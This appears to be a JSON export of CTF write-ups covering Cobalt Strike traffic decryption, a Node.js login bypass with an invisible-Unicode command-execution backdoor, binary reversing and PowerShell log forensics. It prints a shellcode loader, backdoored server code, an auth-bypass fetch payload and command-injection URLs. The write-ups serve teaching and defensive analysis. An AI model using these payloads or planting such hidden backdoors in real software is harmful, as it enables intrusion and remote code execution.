[ { "title": "Decrypting Cobalt Strike traffic - Kalmar CTF 2023 lleHSyniT! writeup", "url": "/posts/kalmarctf2023_tinyshell/", "categories": "CTF writeups, Kalmar CTF 2023", "tags": "ctf-writeups, kalmarCTF2023, forensics", "date": "2023-03-07 18:00:00 +0000", "snippet": "IntroductionThis writeup presents the intended solution for lleHSniT!, one of the forensics challenges of Kalmar CTF 2023.Description One of our users here at StupidCorp ran a malicious binary the...", "content": "IntroductionThis writeup presents the intended solution for lleHSniT!, one of the forensics challenges of Kalmar CTF 2023.Description One of our users here at StupidCorp ran a malicious binary they were sent over an email. We made a process dump, and dumped the network logs. We think it is TinySHell, can you please help figuring out what happened?WriteupTo solve this challenge we received 2 files: capture.pcap, a pcap network traffic capture; proc.dmp, a process dump file.Let’s start by analyzing the pcap file in wireshark. After checking the Protocol Hierarchy (Statistics -&gt; Protocol Hierarchy), we can see the several protocols present in the capture. Protocol hierarchy statisticsIt contains some HTTP packets that might worth taking a closer look. Filtering HTTP packets in wireshark we can see one GET request made to /TnHS, some GET requests made to /g.pixel and some POST requests made to /submit.php?id=&lt;ID&gt;.Wireshark traffic after http filterHTTP streamThe data in the body of the requests appears to be encrypted. Following the TCP/HTTP stream of one of the HTTP requests, the HOST header set to Definitely not evil gives us an hint that requests are being sent over to a malicious ‘evil’ server. It seems that some kind of C2 traffic is going on.With the tshark command:tshark -r capture.pcap -Y 'http' -Tfields -e frame.time -e http.hostit is noticeable the periodicity of the timestamps in the HTTP captured packets as we can see in the tshark output snippet below....Feb 23, 2023 07:15:34.007527000 WET Definitely not evilFeb 23, 2023 07:15:34.019012000 WETFeb 23, 2023 07:15:44.022331000 WET Definitely not evilFeb 23, 2023 07:15:44.023703000 WETFeb 23, 2023 07:15:54.037950000 WET Definitely not evilFeb 23, 2023 07:15:54.050182000 WETFeb 23, 2023 07:15:54.052943000 WET Definitely not evilFeb 23, 2023 07:15:54.053822000 WETFeb 23, 2023 07:16:04.057436000 WET Definitely not evilFeb 23, 2023 07:16:04.058878000 WETFeb 23, 2023 07:16:14.064167000 WET Definitely not evilFeb 23, 2023 07:16:14.076477000 WETFeb 23, 2023 07:16:24.084827000 WET Definitely not evilFeb 23, 2023 07:16:24.097833000 WETFeb 23, 2023 07:16:24.100541000 WET Definitely not evilFeb 23, 2023 07:16:24.101479000 WETFeb 23, 2023 07:16:34.106975000 WET Definitely not evilFeb 23, 2023 07:16:34.405389000 WETFeb 23, 2023 07:16:44.421228000 WET Definitely not evilFeb 23, 2023 07:16:44.422614000 WET...By now we have some indicators that some kind of specialized tool is probably being used to compromise the system and the network. A common one actively (ab)used by a wide range of threat actors from ransomware operators to espionage-focused Advanced Persistent Threats is Cobalt Strike (CS).Cobalt Strike’s default malware payload are called beacons and are used to create a connection to the team server. Active callback sessions from a target are also called beacons.The communication between a Cobalt Strike beacon (client) and a Cobalt Strike team server (C2) is encrypted with AES. The AES key is generated by the client beacon and sent to the C2 server using an encrypted metadata blob (by default a cookie).This metadata is encrypted with RSA encryption algorithm where the beacon has the public key of the C2 server and the private key is stored in the C2 server itself.Cobalt Strike trafficSo now that we know Cobalt Strike beacons communicate over HTTP and encrypt their data with AES, we need to find a way to extract the keys (AES and HMAC) from the memory dump file proc.dmp of the cobalt strike beacon.If we can successfully get these cryptographic keys we can decrypt the data. Fortunely, there are tools to make this process easier as we will see in the further analysis.Usually in CS traffic it is possible to identify the default malware payload beacon called the stager shellcode which consists of a couple of hundred bytes, and does some basic checks and only then queries the configured C2 for the fully featured backdoor. We can search for signs of this stager shellcode by applying the filter http.request.uri matches \"/....$\" in wireshark.Searching for the stager shellcode in wiresharkWe get one result, the request made to the endpoint /TnHS (apparently) is just an endpoint consisted of 4 random alphanumeric characters. However they are not completely random: their 8-bit checksum is a member of a small set of constants.Knowing this, the path TnHS present in the pcap file can be confirmed that it is a valid path to download a 64-bit full beacon (CS x64) after running the metatool (from Didier Stevens Beta Suite) which can be used to analyse suspicious URLs to find relation to exploitation tools such as Cobalt Strike or Metasploit by calculating the checksum of URLs.Checksum calculation with metatoolTo start the analysis of the encrypted traffic we start by extracting the beacon download data of the pcap capture file: Filter by http traffic; Go to File-&gt;Export Objects-&gt;http; Save packet number 48.Extract beacon download dataUsing this beacon data and the tool 1768.py we can get some relevant information about the C2 traffic in our capture.1768.py outputFrom the tool 1768.py output above, the beacon communicates with the IP address 192.168.116[.]128 (option 0x0008) on port 80 (option 0x0002).GET requests use path /g.pixel (option 0x0008), and POST requests use path /submit.php (option 0x000a)At the bottom we also get info about a guess of the Cobalt Strike version (4.3).We also get a lot of other information like the payload type (windows-beacon_http-reverse_http), public key, Host Header, etc.Even knowing that the output didn’t give us a known RSA private key, we have a process memory dump that we can leverage to decrypt the CS traffic using the approach documented in this blog post written by Didier Stevens from NVISO Labs.The tool cs-extract-key (also from DidierStevensSuite) looks in the dumped process memory to find valid AES and HMAC keys using different techniques depending on the CS version. An explanation of these techniques can be found here. To efectively use this tool we need a sample of encrypted data of one of the POST requests.To grab this data in wireshark we can apply the filter http.request.method==POST and get the value in the Data section in the packet details pane or we can use a tshark command like:tshark -r capture.pcap -Y \"http.request.method==POST\" -Tfields -e datato read the capture file, filter POST requests and output their data.Either way, we should be able to get a sample of encrypted data. I chose the following encrypted data sample to work with:00000090bc42642121ebc0a784136ca4a86ef41d66fde0358f119ca6c246fac05765288ab7e21c86418f55052815f1da9521ea5f85253b7a657d37857bfbd2cf9f7ddcd16c063d81f1becfb6faef5df286db10b30d020f30c120b30f8f7beae361ddc8cbf5b36063c60ab5218f5cc0b93c089048eacde1dbbca3877a1b093dd076370de61250f922c396cdf4fcda4c6409a53971With this data we can now run the tool and extract the cryptographic keys from the Cobalt Strike beacon process dump with:./cs-extract-key.py -c &lt;ENCRYPTED_DATA&gt; proc.dmpcs-extract-key.py outputFrom the output above, we get the HMAC key 24a0f5e701439f460d52ef4810f592f3 and the AES key 3c4267894c6fee7a5aaa4d13e0289051.Now it is possible to easily decrypt the traffic with the help of the tool cs parse traffic, also from DidierStevensSuite. The extracted keys must be specified after the flag -k in the format HMACkey:AESkey resulting in the command:./cs-parse-traffic.py --extract capture.pcap -k 24a0f5e701439f460d52ef4810f592f3:3c4267894c6fee7a5aaa4d13e0289051After the tool finishes running, we get some .vir files. Analyzing the cs parse traffic terminal output, packet number 1983 contains the POST request with the data of the file password.txt that was downloaded from the victim computer (image below).cs-parse-traffic outputThe data of the file password.txt was saved in our directory with the md5 hash value of 61ca2f3dc9212781c983f9e13a99be08 in the file name.Let’s run cat to see the contents of this file.$ cat payload-61ca2f3dc9212781c983f9e13a99be08.virDO NOT READ!!!PRIVATE INFORMATION!!!...STOP READING!!!!...AYY I TOLD YOU NOT TO READ...Finding the flag at the end of the fileAt the end of the file is the password kalmar{My_F4v0r1t3_G4m3_1s_Cobalt_Strike:gL0b4l_0p3r4t0rs} which is the flag needed to solve the challenge.References https://www.mandiant.com/resources/blog/defining-cobalt-strike-components https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/ https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/ https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/ https://blog.didierstevens.com/2021/04/26/quickpost-decrypting-cobalt-strike-traffic/" }, { "title": "TyphoonCon CTF 2022 - Web - Hidden Character writeup", "url": "/posts/typhoonconctf2022_hidden_character/", "categories": "CTF writeups, Typhooncon CTF 2022", "tags": "ctf-writeups, TyphoonConCTF2022, web, sqli, javascript, backdoor", "date": "2022-06-25 18:00:00 +0100", "snippet": "Hidden CharacterChallenge Description It takes one character [ ] to show you the path to salvation. And it takes a hidden character to lead you to the flagLet’s start by accessing the website via ...", "content": "Hidden CharacterChallenge Description It takes one character [ ] to show you the path to salvation. And it takes a hidden character to lead you to the flagLet’s start by accessing the website via the given URL. We are presented with the following login form:Login formThe browser extension Wappalyzer gives us information about the technology stack of the website. This website uses the web framework express for Node.js.After doing some research about expressjs vulnerabilities and possible ways to bypass the login, I found a section in HackTricks about Login Bypass techniques saying: Check nodejs potential parsing error: password[password]=1 Nodejs will transform that payload to a query similar to the following one: SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND password=`password`=1; which makes the password bit to be always true. Ok so we can possibly trigger a SQL injection.To attempt this attack I followed the steps decribed in this blog post written by stypr from Flatt Security Inc. which I highly recommend you to read if you want a deep understanding of why this vulnerability happens, the functions and libraries affected and how to remediate it.To execute this attack, first, I opened the developer tools of my web browser. Then, entered a random username and password and clicked login to make a request to the /auth endpoint and get it shown on the developer tools. After that, I copied the authentication request as Fetch code to execute it as JavaScript code.After getting the fetch code, I changed the body parameter to body: \"username=admin&amp;password[password]=1\". Note that I changed the password parameter to password[password] to make the parameter as Object and not String. You can also remove some verbose information from the headers and add a few lines at the end to get only the text of the response (without all the HTML markup) presented in the console tab.The final script used to bypass the login is the following:fetch(\"https://typhooncon-hiddencharacter.chals.io/auth\", { headers: { \"content-type\": \"application/x-www-form-urlencoded\", }, body: \"username=admin&amp;password[password]=1\", method: \"POST\", mode: \"cors\", credentials: \"include\",}).then((r) =&gt; r.text()).then((r) =&gt; { console.log(r);});After running the script above in the console tab, it sucessfuly triggered the SQL injection and bypassed the authentication as we can see from the obtained response in the picture below.Running the script in the console tabThe response we get is the content of the page in the /home endpoint after a successful login.If we go to https://typhooncon-hiddencharacter.chals.io/home we can confirm that we successfully bypassed the login and are logged in as admin. In the home page we see the following content (the same as the content we got in the console tab response of course):home pageLooks like the home page contains part of the web application backend code. The full code that it is presented in the home page is the following:/* Reference: https://codeshack.io/basic-login-system-nodejs-express-mysql/ Run me: docker-compose up --build --always-recreate-deps*/var mysql = require(\"mysql\");var express = require(\"express\");var session = require(\"express-session\");var bodyParser = require(\"body-parser\");var path = require(\"path\");const util = require('util');const exec = util.promisify(require('child_process').exec);var fs = require(\"fs\");var connection = mysql.createConnection({ host: \"localhost\", user: \"login\", password: \"login\", database: \"login\",});const portasulretro = require(\"crypto\").randomBytes(8).toString(\"hex\"); // If only it was 'd7e9bf5c51a0009f'...var app = express();app.use( session({ secret: require(\"crypto\").randomBytes(64).toString(\"hex\"), resave: true, saveUninitialized: true, }));app.use(bodyParser.urlencoded({ extended: true }));app.use(bodyParser.json());app.get(\"/\", function (request, response) { response.sendFile(path.join(__dirname + \"/login.html\"));});app.post(\"/auth\", function (request, response) { var username = request.body.username; var password = request.body.password; if (username &amp;&amp; password) { connection.query( \"SELECT * FROM accounts WHERE username = ? AND password = ?\", [username, password], function (error, results, fields) { if (error) { response.send(`error: ${error}`); } else if (results.length &gt; 0) { request.session.loggedin = true; request.session.username = username; response.redirect(\"/home\"); } else { response.send(\"Incorrect Username and/or Password!\"); } response.end(); } ); } else { response.send(\"Please enter Username and Password!\"); response.end(); }});app.get(\"/home\", function (request, response) { if (request.session.loggedin) { var options = { headers: { 'PortaSulRetro': portasulretro } }; response.sendFile(path.join(__dirname + \"/login.js\"), options); } else { response.send(\"Please login to view this page!\"); response.end(); }});// Check whether we can reach google.com and example.comapp.get(`/${portasulretro}`, async (req, res) =&gt; { const { timeout,ㅤ} = req.query; const checkCommands = [ 'ping -c 1 google.com', 'curl -s http://example.com/',ㅤ ]; try { const outcomes = await Promise.all(checkCommands.map(cmd =&gt; cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 }))); res.status(200).contentType('text/plain'); var outcomeStdout = ''; for(i = 0; outcome = outcomes[i]; i ++) { outcomeStdout += `\"${checkCommands[i]}\": `; outcomeStdout += \"\\n\\n\"; outcomeStdout += outcome.stdout.trim(); outcomeStdout += \"\\n\\n\"; }; res.send(`outcome ok:\\n${outcomeStdout}`); } catch(e) { res.status(500); res.send(`outcome failed: ${e}`); }});app.listen(3000);Looking at this part of the backend code:// Check whether we can reach google.com and example.comapp.get(`/${portasulretro}`, async (req, res) =&gt; { const { timeout,ㅤ} = req.query; const checkCommands = [ 'ping -c 1 google.com', 'curl -s http://example.com/',ㅤ ]; try { const outcomes = await Promise.all(checkCommands.map(cmd =&gt; cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 }))); res.status(200).contentType('text/plain'); var outcomeStdout = ''; for(i = 0; outcome = outcomes[i]; i ++) { outcomeStdout += `\"${checkCommands[i]}\": `; outcomeStdout += \"\\n\\n\"; outcomeStdout += outcome.stdout.trim(); outcomeStdout += \"\\n\\n\"; }; res.send(`outcome ok:\\n${outcomeStdout}`); } catch(e) { res.status(500); res.send(`outcome failed: ${e}`); }});We see that the /${portasulretro} endpoint checks if the server can reach google.com and example.com by executing the commands ping -c 1 google.com and curl -s http://example.com/.The problem with this implementation is that in the lines:const { timeout,\\u3164} = req.query;...'curl -s http://example.com/',\\u3164there are invisible unicodes characters (U+3164 in this case) which can be used as a backdoor as it will be explained.Acording to this blog post written by Wolfgang Ettlinger from Certitude: Beginning with ECMAScript version 2015, all Unicode characters with the Unicode property ID_Start can be used in identifiers(…)The character “ㅤ” (0x3164 in hex) is called “HANGUL FILLER” and belongs to the Unicode category “Letter, other”. As this character is considered to be a letter, it has the ID_Start property and can therefore appear in a JavaScript variableSo because the unicode character U+3164 is considered to be a letter, it can be trivially used as a JavaScript variable name.The line:const { timeout,\\u3164} = req.query;is a destructuring assignment.The author of the blog post also says that: A destructuring assignment is used to deconstruct the HTTP parameters from req.query. Contrary to what can be seen, the parameter timeout is not the sole parameter unpacked from the req.query attribute! An additional variable/HTTP parameter named “ㅤ” is retrieved – if a HTTP parameter named “ㅤ” is passed, it is assigned to the invisible variable.Similarly, when the checkCommands array is constructed, this variable is included into the array:const checkCommands = [ 'ping -c 1 google.com', 'curl -s http://example.com/',ㅤ]; Each element in the array, the hardcoded commands as well as the user-supplied parameter, is then passed to the exec function. This function executes OS commands.So for this attack to work we need to pass a GET parameter representing the invisible variable, in its URL-encoded form (%E3%85%A4), to execute arbitrary OS commands.But before, we need the portasulretro variable so we can access the /${portasulretro} endpoint.Looking at this part of the code:app.get(\"/home\", function (request, response) { if (request.session.loggedin) { var options = { headers: { 'PortaSulRetro': portasulretro } }; response.sendFile(path.join(__dirname + \"/login.js\"), options); } else { response.send(\"Please login to view this page!\"); response.end(); }});we can see that the variable portasulretro is in the header of the response we get when we access the /home endpoint after logging in.Using the developer tools in firefox, we can get the response headers by going to the network tab, selecting the home file and viewing the Response Headers in the Headers section of the panel in the right as we can see in the image below.getting portasulretro variable in /home response headersNow that we have the portasulretro variable we can access the /${portasulretro} endpoint (/5b95fcec4c343d87) and execute the OS commands to get the flag.To execute OS commands we need to pass as a GET parameter to the URL the U+3164 unicode character in its URL-encoded form (%E3%85%A4) and the respective OS command that we want to execute to the endpoint /${portasulretro} (/5b95fcec4c343d87).Executing the ls command with: https://typhooncon-hiddencharacter.chals.io/5b95fcec4c343d87?%E3%85%A4=ls returns the following response:Response after executing the ls commandAs we can see in the image above, the server executed the ls command and returned the command output. In the ls command output we can see a file called flag so let’s get its content with: https://typhooncon-hiddencharacter.chals.io/5b95fcec4c343d87?%E3%85%A4=cat%20flag and get the response:getting the flag by executing the cat flag commandAnd we get the flag SSD{bfee01bf8ca5f1766fb91b3b4a0533614da92beb}" }, { "title": "HTB Cyber Apocalypse CTF 2022 - Reversing - WIDE, Rebuilding, Without a Trace & Teleport writeups", "url": "/posts/htbca2022_reversing/", "categories": "CTF writeups, HackTheBox Cyber Apocalypse CTF 2022", "tags": "ctf-writeups, HackTheBox, HTBca2022, reverse-engineering", "date": "2022-05-22 18:00:00 +0100", "snippet": "WIDEChallenge Info We’ve received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You’ve managed to smuggle a discarded access terminal to the Widely Inflate...", "content": "WIDEChallenge Info We’ve received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You’ve managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control?For this challenge we are given an ELF 64-bit LSB pie executable x86-64 file called wide and a file named db.ex.When we execute the wide file with db.ex as a parameter we are prompted with the following:Since the challenge info refer to the Flaggle Alpha dimension, let’s select its correspondent number (6).Program outputBy selecting the dimension number 6 (Flaggle Alpha), the program asks us for the WIDE decryption key.Let’s now open the executable file wide in Ghidra to decompile the program.After opening wide in Ghidra and selecting the main function, let’s go to the decompiler section to see if we can find some useful information.main function in GhidraIn the main function we see some code responsible for displaying some error messages if we don’t run the program with the right parameters and also some code responsible for printing the text that we see when the program is being executed.In line 45, we can see that a function named menu is called so let’s take a look at what that function does.menu function in GhidraLooking at the function menu, we can see that in line 152, a string comparison is being made using wcscmp to see if our input matches the string sup3rs3cr3tw1d3.So now let’s input the string sup3rs3cr3tw1d3 when the program asks us for the WIDE decryption key.Program output the flagAnd we get the flag HTB{str1ngs_4r3nt_4lw4ys_4sc11}RebuildingChallenge Info You arrive on a barren planet, searching for the hideout of a scientist involved in the Longhir resistance movement. You touch down at the mouth of a vast cavern, your sensors picking up strange noises far below. All around you, ancient machinery whirrs and spins as strange sigils appear and change on the walls. You can tell that this machine has been running since long before you arrived, and will continue long after you’re gone. Can you hope to understand its workings?The file that we get for this challenge is an ELF 64-bit LSB pie executable x86-64 called rebuilding.When we execute the program with a password as a parameter we are prompted with the following:Looking at the output, we see that the program points out that the Password length is incorrect. So the first thing we are going to do is find the password length. Let’s open the executable file rebuilding in Ghidra.main function in GhidraLooking at the line 19 in the main function above we can see a conditional statement to check if (sVar1 == 0x20). 0x20 in hexadecimal is equal to 32 in Decimal. So the length of the password is 32 characters. Let’s run the program with a random 32 characters password to see what happens.program outputThe program takes a few seconds Calculating and then returns The password is incorrect. Let’s go back to Ghidra.In line 38 of the main function we see a conditional statement that check if (local_14 == 0x20) the program outputs The password is correct.Analyzing the main functionAnalyzing the variable local_14 previous appearances in the main function we note that in line 32 an array called encrypted is being XORed with a key.Analyzing the local_14 variableBy clicking on encrypted we can see some data in hex.Analyzing the encrypted dataTo quickly extract the hexadecimal data to build the encrypted array, select all the data of the picture above, right click and select Copy Special....Copying the hex dataThen select Byte String and click OK.Copying the hex data 2We extracted the following encoded string in hex: 29 38 2b 1e 06 42 05 5d 07 02 31 42 0f 33 0a 55 00 00 15 1e 1c 06 1a 43 13 59 36 54 00 42 15 11 00Going back to the main function, by clicking on key we are able to view the string humans that supposedly is used as a key to XOR the hex string above and decode the data.Finding the key humansNow we go to CyberChef and use the key humans to try to decode the hex string extracted earlier.Decoding the hex string with the key humansAs we can see from the picture above, it didn’t work. Let’s go back to Ghidra.After analyzing more in-depth the program in Ghidra we find a very interesting function called _INIT_1.Finding the key aliensLooking at the assembly code on the left we can see that the humans string is being replaced with the string aliens. The decompiler section on the right helps us to better visualize each letter that is going to form this string. Let’s test this string to see if we found the correct key to decrypt the hex data.Go to CyberChef again and use the key aliens to decode the hex string.Decoding the hex string with the key aliensAnd we get the flag HTB{h1d1ng_1n_c0nstruct0r5_1n1t}Without a TraceChallenge Info Draeger’s mothership has suddenly vanished, he could be readying an attack! You need to track him down before disaster strikes…The file that we get for this challenge is an ELF 64-bit LSB pie executable x86-64 called without_a_trace.When we run the executable we are prompted with the following output:Let’s run the executable again but now using ltrace to see if we can get some useful information.Executing the program with ltraceWith ltrace we can see a string comparison the program makes between our input (password1) and the string IUCzus5b2^l2^tq^c5^t^f1f1| to check if the password is correct.Let’s go to CyberChef and try to decode the string IUCzus5b2^l2^tq^c5^t^f1f1|.Decoding the flag in CyberChefAnd we get the flag HTB{tr4c3_m3_up_b4_u_g0g0}TeleportChallenge Info You’ve been sent to a strange planet, inhabited by a species with the natural ability to teleport. If you’re able to capture one, you may be able to synthesise lightweight teleportation technology. However, they don’t want to be caught, and disappear out of your grasp - can you get the drop on them?For this challenge we are given an ELF 64-bit LSB pie executable x86-64 stripped file called teleport.When excuting the program with a password as a parameter, we get the following:Program outputLet’s open Ghidra to analyze the program.To start our analysis we go to the Symbol Tree section in Ghidra where we can see all the functions.Symbol Tree section in GhidraLet’s analyze FUN_00100b2a.FUN_00100b2a in ghidraIn this function we can see an if statement on line 11 to check if the character t is in the address 0x00303291.When we go through the other functions, we see that they have a similar logic to FUN_00100b2a where the if statement checks if a character is in the correct address.Take for example FUN_00100f6aFUN_00100f6a in ghidraand FUN_00100dd2FUN_00100dd2 in ghidraLooking at these functions we can see similar character checks to the one shown earlier.When we double click on DAT_00303281, Ghidra takes us to the following part in the listing section:We can see a range of addresses from 0x00303280 to 0x003032aa in which each of those addresses refer to a function.As we seen earlier each function should contain a character that is being checked if it’s in the correct address with an if statement.If we click on the function (in green) next to each address on that part of the listing section (of the last picture), we get to see the respective function and the corresponding character present in the if statement.By putting together all the letters in the functions starting in address 0x00303280 and ending on the 0x003032aa address, we get the flag:HTB{h0pp1ng_thru_th3_sp4c3_t1m3_c0nt1nuum!}" }, { "title": "HTB Cyber Apocalypse CTF 2022 - Forensics - Puppeteer writeup", "url": "/posts/htbca2022_puppeteer/", "categories": "CTF writeups, HackTheBox Cyber Apocalypse CTF 2022", "tags": "ctf-writeups, HackTheBox, HTBca2022, windows-forensics, forensics", "date": "2022-05-21 23:00:00 +0100", "snippet": "PuppeteerChallenge Info Planet Longhir is known for it’s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. ...", "content": "PuppeteerChallenge Info Planet Longhir is known for it’s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation’s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite’s location was leaked since it is a top-sercret that only Galactic Federation’s council is aware of. Help her analyse the Council’s HQ event logs and solve this mystery.For this challenge we get a folder with Windows Event Log files (.evtx).The first thing we should do is analyze all the Log files to see if we can catch any useful information. To do that we will use the Windows Event Viewer app.In the description of one of the warnings in the Microsoft-Windows-PowerShell%4Operational.evtx file we have a powershell script that was created to run some code.Powershell script in Microsoft-Windows-PowerShell%4Operational.evtx fileThe complete powershell script that we get from the Windows Event Log file above is the following:$OleSPrlmhB = @\"[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\"@[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;$tNZvQCljVk = Add-Type -memberDefinition $OleSPrlmhB -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]] $HVOASfFuNSxRXR = 0x2d,0x99,0x52,0x35,0x21,0x39,0x1d,0xd1,0xd1,0xd1,0x90,0x80,0x90,0x81,0x83,0x99,0xe0,0x03,0xb4,0x99,0x5a,0x83,0xb1,0x99,0x5a,0x83,0xc9,0x80,0x87,0x99,0x5a,0x83,0xf1,0x99,0xde,0x66,0x9b,0x9b,0x9c,0xe0,0x18,0x99,0x5a,0xa3,0x81,0x99,0xe0,0x11,0x7d,0xed,0xb0,0xad,0xd3,0xfd,0xf1,0x90,0x10,0x18,0xdc,0x90,0xd0,0x10,0x33,0x3c,0x83,0x99,0x5a,0x83,0xf1,0x90,0x80,0x5a,0x93,0xed,0x99,0xd0,0x01,0xb7,0x50,0xa9,0xc9,0xda,0xd3,0xde,0x54,0xa3,0xd1,0xd1,0xd1,0x5a,0x51,0x59,0xd1,0xd1,0xd1,0x99,0x54,0x11,0xa5,0xb6,0x99,0xd0,0x01,0x5a,0x99,0xc9,0x81,0x95,0x5a,0x91,0xf1,0x98,0xd0,0x01,0x32,0x87,0x99,0x2e,0x18,0x9c,0xe0,0x18,0x90,0x5a,0xe5,0x59,0x99,0xd0,0x07,0x99,0xe0,0x11,0x90,0x10,0x18,0xdc,0x7d,0x90,0xd0,0x10,0xe9,0x31,0xa4,0x20,0x9d,0xd2,0x9d,0xf5,0xd9,0x94,0xe8,0x00,0xa4,0x09,0x89,0x95,0x5a,0x91,0xf5,0x98,0xd0,0x01,0xb7,0x90,0x5a,0xdd,0x99,0x95,0x5a,0x91,0xcd,0x98,0xd0,0x01,0x90,0x5a,0xd5,0x59,0x90,0x89,0x90,0x89,0x8f,0x88,0x99,0xd0,0x01,0x8b,0x90,0x89,0x90,0x88,0x90,0x8b,0x99,0x52,0x3d,0xf1,0x90,0x83,0x2e,0x31,0x89,0x90,0x88,0x8b,0x99,0x5a,0xc3,0x38,0x9a,0x2e,0x2e,0x2e,0x8c,0x98,0x6f,0xa6,0xa2,0xe3,0x8e,0xe2,0xe3,0xd1,0xd1,0x90,0x87,0x98,0x58,0x37,0x99,0x50,0x3d,0x71,0xd0,0xd1,0xd1,0x98,0x58,0x34,0x98,0x6d,0xd3,0xd1,0xd4,0xe8,0x11,0x79,0xd1,0xc3,0x90,0x85,0x98,0x58,0x35,0x9d,0x58,0x20,0x90,0x6b,0x9d,0xa6,0xf7,0xd6,0x2e,0x04,0x9d,0x58,0x3b,0xb9,0xd0,0xd0,0xd1,0xd1,0x88,0x90,0x6b,0xf8,0x51,0xba,0xd1,0x2e,0x04,0xbb,0xdb,0x90,0x8f,0x81,0x81,0x9c,0xe0,0x18,0x9c,0xe0,0x11,0x99,0x2e,0x11,0x99,0x58,0x13,0x99,0x2e,0x11,0x99,0x58,0x10,0x90,0x6b,0x3b,0xde,0x0e,0x31,0x2e,0x04,0x99,0x58,0x16,0xbb,0xc1,0x90,0x89,0x9d,0x58,0x33,0x99,0x58,0x28,0x90,0x6b,0x48,0x74,0xa5,0xb0,0x2e,0x04,0x54,0x11,0xa5,0xdb,0x98,0x2e,0x1f,0xa4,0x34,0x39,0x42,0xd1,0xd1,0xd1,0x99,0x52,0x3d,0xc1,0x99,0x58,0x33,0x9c,0xe0,0x18,0xbb,0xd5,0x90,0x89,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xaf,0x84,0x99,0x52,0x15,0xf1,0x8f,0x58,0x27,0xbb,0x91,0x90,0x88,0xb9,0xd1,0xc1,0xd1,0xd1,0x90,0x89,0x99,0x58,0x23,0x99,0xe0,0x18,0x90,0x6b,0x89,0x75,0x82,0x34,0x2e,0x04,0x99,0x58,0x12,0x98,0x58,0x16,0x9c,0xe0,0x18,0x98,0x58,0x21,0x99,0x58,0x0b,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xac,0xf9,0x89,0x90,0x86,0x88,0xb9,0xd1,0x91,0xd1,0xd1,0x90,0x89,0xbb,0xd1,0x8b,0x90,0x6b,0xda,0xfe,0xde,0xe1,0x2e,0x04,0x86,0x88,0x90,0x6b,0xa4,0xbf,0x9c,0xb0,0x2e,0x04,0x98,0x2e,0x1f,0x38,0xed,0x2e,0x2e,0x2e,0x99,0xd0,0x12,0x99,0xf8,0x17,0x99,0x54,0x27,0xa4,0x65,0x90,0x2e,0x36,0x89,0xbb,0xd1,0x88,0x98,0x16,0x13,0x21,0x64,0x73,0x87,0x2e,0x04;[array]::Reverse($stage2);$hRffYLENA = $tNZvQCljVk::VirtualAlloc(0,[Math]::Max($HVOASfFuNSxRXR.Length,0x1000),0x3000,0x40);$stage3 = $stage1 + $stage2;[System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length);# Unpack Shellcode;for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++){ $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1;}#Unpack Special Orders!for($i=0;$i -lt $stage3.count;$i++){ $stage3[$i] = $stage3[$i] -bxor 0xd1;}$tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0);Looking at the end of the script, we can see how the special orders are unpacked. The $stage3 string (result of $stage1 + $stage2) is being XORed with -bxor using the key 0xd1.Let’s make some changes to the script to get the $stage3 output after the XOR operation.$stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;$stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;[array]::Reverse($stage2);$stage3 = $stage1 + $stage2;for($i=0;$i -lt $stage3.count;$i++){ $stage3[$i] = $stage3[$i] -bxor 0xd1;}echo $stage3;Now let’s execute the modified script, piping the output with Format-HexOutput of the modified script to get the flagAnd we get the flag HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3...}" } ]
